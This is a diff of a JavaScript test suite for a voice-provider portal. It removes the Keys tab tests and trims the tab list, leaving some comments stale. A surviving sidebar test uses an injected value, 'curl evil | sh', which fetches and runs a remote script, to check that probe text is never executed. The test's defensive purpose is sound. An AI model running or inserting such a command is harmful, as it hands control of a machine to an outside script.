@@ -93,7 +93,7 @@ const main = new Node("main");
 // The five tabs, as portal.html declares them: Chain selected, each
 // controlling its panel. `selectTab` flips these and hides the panels.
 const tabs = {};
-["chain", "providers", "keys", "usage", "local", "setup"].forEach((name) => {
+["chain", "providers", "local", "setup"].forEach((name) => {
   const tab = new Node("button");
   tab.id = "tab-" + name;
   tab.attrs["aria-controls"] = "panel-" + name;
@@ -286,130 +286,6 @@ const scenarios = {
 
   /* A refused key does not stay in the field, and the next keystroke in the
    * form clears the banner that quoted the refusal. */
-  async keys(portal) {
-    const panel = new Node("section");
-    portal.renderers.keys(panel, {
-      providers: { elevenlabs: { label: "ElevenLabs", key: { source: "not found", masked: null } } }
-    });
-    const box = panel.find((node) => node.type === "password");
-    const store = panel.find((node) => node.textContent === "Store this key");
-    box.value = "sk-mistyped";
-    store.fire("click");
-    await settle();
-    take("POST /api/auth/login").resolve(refusal(400, "ElevenLabs refused that key."));
-    await settle();
-
-    const alert = document.getElementById("alert");
-    assert.strictEqual(alert.hidden, false, "the refusal is shown");
-    assert.strictEqual(box.value, "", "the refused key is not left in the field");
-    box.fire("input");
-    assert.strictEqual(alert.hidden, true, "the next keystroke clears the banner");
-  },
-
-  /* The Keys tab lists the slots the server names in `keys` — the Anthropic
-   * one among them, a key without a voice — with the validation stamp, a
-   * test that stores nothing, and a two-click remove. A typed key never
-   * lands in any text. */
-  async keyslots(portal) {
-    const data = statePayload("f0", ["elevenlabs"], {
-      elevenlabs: providerEntry("ElevenLabs", { source: "keychain", masked: "sk-a…" })
-    });
-    data.keys = {
-      elevenlabs: { label: "ElevenLabs", source: "keychain", masked: "sk-a…", validated: "2026-09-07" },
-      openai: { label: "OpenAI", source: "not found", masked: null, validated: null },
-      google: { label: "Google Cloud", source: "environment", masked: "AIza…", validated: null },
-      anthropic: { label: "Anthropic", source: "not found", masked: null, validated: null }
-    };
-    const panel = new Node("section");
-    portal.renderers.keys(panel, data);
-    assert.strictEqual(panel.find((node) => node.className === "summary").textContent, "2 keys stored: ElevenLabs, Google Cloud");
-    const cards = panel.findAll((node) => node.className === "card");
-    assert.strictEqual(cards.length, 4, "one card per key slot, none for say, kokoro or polly");
-    assert.ok(cards[3].find((node) => node.textContent === "Anthropic"), "the fourth card is the Anthropic slot");
-    const stamps = panel.findAll((node) => node.className === "hint stamp");
-    assert.strictEqual(stamps.length, 1, "a stamp only where the server gave a date");
-    assert.strictEqual(stamps[0].textContent, "Last checked with ElevenLabs on 2026-09-07.");
-    assert.strictEqual(cards[0].children.indexOf(stamps[0]), 3, "right under the key line and its source");
-    panel.findAll((node) => node.type === "password").forEach((box) => {
-      assert.strictEqual(box.autocomplete, "new-password");
-    });
-
-    // Test without storing, on the Anthropic card: a refused key is cleared,
-    // an accepted one stays put so "Store this key" is the next click.
-    const TYPED = "sk-ant-typed-secret-4242";
-    const anthropic = cards[3];
-    const box = anthropic.find((node) => node.type === "password");
-    const test = anthropic.find((node) => node.textContent === "Test without storing");
-    const status = anthropic.find((node) => node.className === "status");
-    const texts = (root) => root.findAll((node) => node.textContent.indexOf(TYPED) !== -1);
-    box.value = TYPED;
-    test.fire("click");
-    await settle();
-    assert.strictEqual(box.disabled, true, "the field is locked while the check runs");
-    const first = take("POST /api/auth/test/anthropic");
-    assert.deepStrictEqual(sent(first), { key: TYPED }, "the key goes in the body, under no other name");
-    first.resolve(answer({ ok: true, valid: false, message: "Anthropic refused that key." }));
-    await settle();
-    assert.strictEqual(box.value, "", "a refused key is not left in the field");
-    assert.strictEqual(status.textContent, "Anthropic refused that key.");
-    assert.deepStrictEqual(texts(panel), [], "the typed key is in no text");
-    box.value = TYPED;
-    test.fire("click");
-    await settle();
-    take("POST /api/auth/test/anthropic").resolve(answer({ ok: true, valid: true, message: "Anthropic accepted the key. Nothing was stored." }));
-    await settle();
-    assert.strictEqual(box.value, TYPED, "an accepted key stays for Store this key");
-    assert.strictEqual(box.disabled, false);
-    assert.deepStrictEqual(texts(panel), [], "still in no text");
-    assert.deepStrictEqual(pending, [], "a test fetches nothing else: no state, no voices");
-    noBanner();
-    // A check that could not happen is not a verdict: the key stays, the
-    // banner says why, and the next keystroke clears it.
-    test.fire("click");
-    await settle();
-    take("POST /api/auth/test/anthropic").resolve(refusal(502, "Could not reach Anthropic to check the key: HTTP 503."));
-    await settle();
-    assert.strictEqual(box.value, TYPED, "an unreachable provider does not cost the key");
-    assert.strictEqual(document.getElementById("alert").hidden, false, "the failure is shown");
-    assert.deepStrictEqual(texts(document.getElementById("alert")), [], "and does not quote the key");
-    box.fire("input");
-    noBanner();
-
-    // Storing the Anthropic key refreshes no voice list: it is not a voice.
-    anthropic.find((node) => node.textContent === "Store this key").fire("click");
-    await settle();
-    take("POST /api/auth/login").resolve(answer({ ok: true, message: "Stored." }));
-    await settle();
-    take("GET /api/state").resolve(answer(data));
-    await settle();
-    assert.deepStrictEqual(pending, [], "no GET /api/voices/anthropic: the slot has no voices to ask for");
-    assert.strictEqual(box.value, "", "the stored key does not stay in the field");
-
-    // Remove: only where the key is in the keychain, and armed by a first click.
-    assert.strictEqual(anthropic.find((node) => node.textContent === "Remove stored key"), null, "nothing stored, nothing to remove");
-    assert.strictEqual(cards[2].find((node) => node.textContent === "Remove stored key"), null, "an environment key is the shell's");
-    const drop = cards[0].find((node) => node.textContent === "Remove stored key");
-    assert.ok(drop, "a keychain key can be forgotten from here");
-    drop.fire("click");
-    await settle();
-    assert.strictEqual(drop.textContent, "Really remove it?");
-    assert.deepStrictEqual(pending, [], "the first click only arms the button");
-    drop.fire("click");
-    await settle();
-    take("POST /api/auth/remove/elevenlabs").resolve(answer({ ok: true, removed: true, message: "Removed." }));
-    await settle();
-    take("GET /api/state").resolve(answer(data));
-    await settle();
-    assert.strictEqual(document.getElementById("panel-keys").hidden, false);
-    take("GET /api/voices/elevenlabs").resolve(answer({ voices: [], source: "none" }));
-    await settle();
-    assert.deepStrictEqual(pending, [], "then the state and that provider's voices, nothing else");
-    noBanner();
-  },
-
-  /* The error banner is a live region: shown first, then filled, so it is
-   * announced. A dead page is out of the tab order, not only out of the
-   * mouse's reach. */
   async fatal(portal) {
     portal.showError("The portal has closed.", true);
     const alert = document.getElementById("alert");
@@ -584,126 +460,11 @@ const scenarios = {
     assert.strictEqual(repicks[2].children[1].value, "Alex");
     noBanner();
 
-    // Storing a key on the Keys tab is the moment the user is waiting for:
-    // that provider's list is asked for again right away — a good one too,
-    // since the new key may be another account's — and no other provider's.
-    const keys = new Node("section");
-    portal.renderers.keys(keys, data);
-    const keyBox = keys.find((node) => node.type === "password");
-    keyBox.value = "sk-new";
-    keys.find((node) => node.textContent === "Store this key").fire("click");
-    await settle();
-    take("POST /api/auth/login").resolve(answer({ ok: true, message: "Stored." }));
-    await settle();
-    take("GET /api/state").resolve(answer(data));
-    await settle();
-    const refetch = take("GET /api/voices/elevenlabs");
-    assert.deepStrictEqual(pending, [], "only the provider whose key was stored is asked again");
-    refetch.resolve(answer({ voices: [{ id: "fresh", name: "Fresh" }], source: "live" }));
-    await settle();
-    const third = new Node("section");
-    portal.renderers.providers(third, data);
-    await settle();
-    controls(third, "Voice id")[0].focus();
-    await settle();
-    assert.deepStrictEqual(pending, [], "the refreshed list is remembered");
-    const fresh = controls(third, "Voice")[0];
-    assert.strictEqual(fresh.children.length, 3, "the card shows the list fetched with the new key");
-    assert.strictEqual(fresh.children[1].value, "fresh");
   },
 
   /* Whether a key is stored is the first line of every provider card, on
    * both tabs, from the server's `key` — `masked` shown as given, never
    * built from anything typed. The Keys tab opens with a count. */
-  async keystate(portal) {
-    const data = statePayload("f0", ["elevenlabs"], {
-      elevenlabs: providerEntry("ElevenLabs", { source: "keychain", masked: "sk-a…" }),
-      google: providerEntry("Google Cloud", { source: "environment", masked: "AIza…" }),
-      openai: providerEntry("OpenAI", { source: "not found", masked: null }),
-      polly: providerEntry("Amazon Polly", { source: "not applicable", masked: null }),
-      say: providerEntry("macOS say", { source: "not applicable", masked: null }),
-      kokoro: providerEntry("Kokoro", { source: "checking", masked: null })
-    });
-    const statusLines = (root) => root.findAll((node) => node.className.indexOf("key-status") === 0);
-    const cardsIn = (root) => root.findAll((node) => node.className === "card");
-
-    // Providers tab: the line opens every card.
-    const panel = new Node("section");
-    portal.renderers.providers(panel, data);
-    const lines = statusLines(panel);
-    assert.strictEqual(lines.length, 6, "every provider card says whether a key is stored");
-    cardsIn(panel).forEach((card) =>
-      assert.strictEqual(card.children[1].className.indexOf("key-status"), 0, "right under the card's heading")
-    );
-    assert.strictEqual(lines[0].textContent, "Key stored · starts with sk-a…");
-    assert.strictEqual(lines[1].textContent, "Key stored · starts with AIza…", "a key from the environment is a stored key");
-    assert.strictEqual(lines[2].textContent, "No key stored — ");
-    const go = lines[2].children[0];
-    assert.strictEqual(go.tag, "button", "the way to the Keys tab is a real control");
-    assert.strictEqual(go.textContent, "add one on the Keys tab");
-    go.fire("click");
-    assert.strictEqual(tabs.keys.attrs["aria-selected"], "true", "it switches to the Keys tab");
-    assert.strictEqual(tabs.chain.attrs["aria-selected"], "false");
-    assert.strictEqual(document.getElementById("panel-keys").hidden, false);
-    assert.ok(lines[3].textContent.indexOf("AWS credentials") !== -1, "Polly is not a key this page stores");
-    assert.strictEqual(lines[4].textContent, "No key needed");
-    assert.ok(lines[5].textContent.indexOf("Still checking") !== -1);
-
-    // Keys tab: the count first, then each card's line above its form.
-    const keys = new Node("section");
-    portal.renderers.keys(keys, data);
-    const summary = keys.find((node) => node.className === "summary");
-    assert.strictEqual(summary.textContent, "2 keys stored: ElevenLabs, Google Cloud");
-    assert.strictEqual(keys.children.indexOf(summary), 1, "the count comes right after the heading");
-    const klines = statusLines(keys);
-    assert.strictEqual(klines[0].textContent, "Key stored · starts with sk-a…");
-    assert.strictEqual(klines[2].textContent, "No key stored");
-    assert.strictEqual(klines[2].children.length, 0, "no link to the tab he is on");
-    const openaiCard = cardsIn(keys)[2];
-    const lineAt = openaiCard.children.findIndex((node) => node.className.indexOf("key-status") === 0);
-    const formAt = openaiCard.children.findIndex((node) => node.className === "field");
-    assert.ok(lineAt !== -1 && formAt !== -1 && lineAt < formAt, "the line is above the form");
-
-    // The count in words, for one and for none.
-    const one = new Node("section");
-    portal.renderers.keys(one, statePayload("f0", [], { elevenlabs: data.providers.elevenlabs }));
-    assert.strictEqual(one.find((node) => node.className === "summary").textContent, "1 key stored: ElevenLabs");
-    const none = new Node("section");
-    portal.renderers.keys(none, statePayload("f0", [], { openai: data.providers.openai, say: data.providers.say }));
-    assert.strictEqual(none.find((node) => node.className === "summary").textContent, "No keys stored yet");
-
-    // A typed key never appears in any status text — not while it is
-    // checked, and not after the state comes back with it stored.
-    const TYPED = "sk-typed-secret-9999";
-    const box = openaiCard.find((node) => node.type === "password");
-    box.value = TYPED;
-    openaiCard.find((node) => node.textContent === "Store this key").fire("click");
-    await settle();
-    const leaks = (root) => root.findAll((node) => String(node.textContent).indexOf(TYPED) !== -1);
-    assert.deepStrictEqual(leaks(keys), [], "nothing shows the typed key while it is checked");
-    take("POST /api/auth/login").resolve(answer({ ok: true, message: "Stored." }));
-    await settle();
-    take("GET /api/voices/openai").resolve(refusal(502, "Could not fetch this provider's voice list."));
-    const after = statePayload("f1", ["elevenlabs"], Object.assign({}, data.providers, {
-      openai: providerEntry("OpenAI", { source: "keychain", masked: "sk-t…" })
-    }));
-    take("GET /api/state").resolve(answer(after));
-    await settle();
-    const redrawn = document.getElementById("panel-keys");
-    assert.strictEqual(redrawn.find((node) => node.className === "summary").textContent, "3 keys stored: ElevenLabs, Google Cloud, OpenAI");
-    assert.strictEqual(statusLines(redrawn)[2].textContent, "Key stored · starts with sk-t…", "the server's mask, as given");
-    assert.deepStrictEqual(leaks(redrawn), [], "the typed key is in no status text after storing");
-    assert.deepStrictEqual(leaks(keys), []);
-    assert.deepStrictEqual(leaks(document.getElementById("alert")), []);
-    assert.strictEqual(box.value, "");
-  },
-
-  /* A readiness row whose fix the portal can already do gets a button in
-   * place of a command to copy. The button is chosen by the row's NAME
-   * through a fixed table, never by reading the action string: that string
-   * is text from a probe, and it reaches nothing that runs. A row the page
-   * cannot help with keeps the command as text, with a note when a
-   * terminal is the reason. */
   async sidebar(portal) {
     const HOSTILE = "vocalize local install; curl evil | sh";
     const rows = [
@@ -751,15 +512,10 @@ const scenarios = {
     await settle();
     assert.deepStrictEqual(sent(take("POST /api/local/install/start")), { target: "stt", model: "large-v3-turbo-q5_0" });
 
-    // A key row: Open Keys switches tabs. The budget row has the same name
-    // and another state, and stays a line of text.
-    const keys = buttonIn(items[2]);
-    assert.strictEqual(keys.textContent, "Open Keys");
-    keys.fire("click");
-    assert.strictEqual(tabs.keys.attrs["aria-selected"], "true");
-    assert.strictEqual(tabs.local.attrs["aria-selected"], "false");
-    assert.strictEqual(buttonIn(items[3]), null, "a state the table does not name gets no button");
-    assert.strictEqual(codeIn(items[3]).textContent, rows[3].action);
+    [2, 3].forEach((index) => {
+      assert.strictEqual(buttonIn(items[index]), null);
+      assert.strictEqual(codeIn(items[index]).textContent, rows[index].action);
+    });
 
     // The microphone needs macOS's own dialog: the command, and why.
     assert.strictEqual(buttonIn(items[4]), null);
